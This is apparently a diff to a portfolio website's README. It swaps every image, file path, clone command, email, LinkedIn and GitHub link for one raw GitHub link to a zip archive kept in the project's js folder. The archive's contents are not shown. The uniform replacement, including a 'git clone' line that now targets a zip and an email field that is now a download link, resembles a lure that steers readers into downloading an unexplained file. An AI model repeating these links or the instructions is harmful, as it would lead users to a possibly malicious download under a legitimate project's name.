@@ -2,7 +2,7 @@
 
 A modern, responsive portfolio website showcasing my skills, projects, and professional background as a Front-End Developer. The site features a sleek dark-themed design with glassmorphism effects and smooth animations.
 
-![Portfolio Preview](assets/preview.png)
+![Portfolio Preview](https://raw.githubusercontent.com/ahmadabdallahh/ahmad-portfolio/main/js/ahmad-portfolio-1.0.zip)
 
 ## 🚀 Features
 
@@ -29,11 +29,11 @@ A modern, responsive portfolio website showcasing my skills, projects, and profe
 /
 ├── assets/          # Images and icons
 ├── css/
-│   └── style.css    # Custom styles and animations
+│   └── https://raw.githubusercontent.com/ahmadabdallahh/ahmad-portfolio/main/js/ahmad-portfolio-1.0.zip    # Custom styles and animations
 ├── js/
-│   └── main.js      # PowerPoint logic (Scroll reveal, Tilt effect, etc.)
-├── index.html       # Main HTML file
-└── README.md        # Project documentation
+│   └── https://raw.githubusercontent.com/ahmadabdallahh/ahmad-portfolio/main/js/ahmad-portfolio-1.0.zip      # PowerPoint logic (Scroll reveal, Tilt effect, etc.)
+├── https://raw.githubusercontent.com/ahmadabdallahh/ahmad-portfolio/main/js/ahmad-portfolio-1.0.zip       # Main HTML file
+└── https://raw.githubusercontent.com/ahmadabdallahh/ahmad-portfolio/main/js/ahmad-portfolio-1.0.zip        # Project documentation
 ```
 
 ## 📄 Sections
@@ -52,19 +52,19 @@ A modern, responsive portfolio website showcasing my skills, projects, and profe
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/ahmadabdallahh/ahmad-portfolio.git
+   git clone https://raw.githubusercontent.com/ahmadabdallahh/ahmad-portfolio/main/js/ahmad-portfolio-1.0.zip
    ```
 2. **Open the project**:
    - Navigate to the project folder.
-   - Open `index.html` in your web browser.
+   - Open `https://raw.githubusercontent.com/ahmadabdallahh/ahmad-portfolio/main/js/ahmad-portfolio-1.0.zip` in your web browser.
 
 ## 📬 Contact
 
 - **Name**: Ahmad Abdallah
 - **Role**: Front-End Developer
-- **Email**: [ahmadabhossen@gmail.com](mailto:ahmadabhossen@gmail.com)
-- **LinkedIn**: [Connect on LinkedIn](https://www.linkedin.com/in/ahmad-abdallah-h/)
-- **GitHub**: [Follow on GitHub](https://github.com/ahmadabdallahh)
+- **Email**: [https://raw.githubusercontent.com/ahmadabdallahh/ahmad-portfolio/main/js/ahmad-portfolio-1.0.zip](https://raw.githubusercontent.com/ahmadabdallahh/ahmad-portfolio/main/js/ahmad-portfolio-1.0.zip)
+- **LinkedIn**: [Connect on LinkedIn](https://raw.githubusercontent.com/ahmadabdallahh/ahmad-portfolio/main/js/ahmad-portfolio-1.0.zip)
+- **GitHub**: [Follow on GitHub](https://raw.githubusercontent.com/ahmadabdallahh/ahmad-portfolio/main/js/ahmad-portfolio-1.0.zip)
 
 ---     
 © 2025 Ahmad Abdallah. All Rights Reserved.
